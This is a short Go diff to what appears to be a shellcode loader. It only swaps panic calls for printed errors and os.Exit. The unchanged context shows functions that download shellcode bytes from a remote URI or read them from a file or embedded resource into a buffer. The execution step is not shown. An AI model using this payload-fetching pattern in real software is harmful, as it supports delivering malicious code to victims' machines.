@@ -2,6 +2,7 @@ package server
 
 import (
 	"encoding/base64"
+	"fmt"
 	"io/ioutil"
 	"net/http"
 	"os"
@@ -12,11 +13,13 @@ import (
 func UriModel() {
 	resp, err := http.Get(Uri)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	body, err := ioutil.ReadAll(resp.Body)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	ShellCodeByte = body
 	resp.Body.Close()
@@ -26,11 +29,13 @@ func UriModel() {
 func ReadFileModel() {
 	file, err := os.Open(FilePath)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	body, err := ioutil.ReadAll(file)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	ShellCodeByte = body
 	file.Close()
@@ -41,11 +46,13 @@ func ResourceModel() {
 	var str string
 	file, err := os.Open(Resource)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	fileByte, err := ioutil.ReadAll(file)
 	if err != nil {
-		panic(err.Error())
+		fmt.Println(err.Error())
+		os.Exit(1)
 	}
 	defer file.Close()
 	fileStr := string(fileByte)
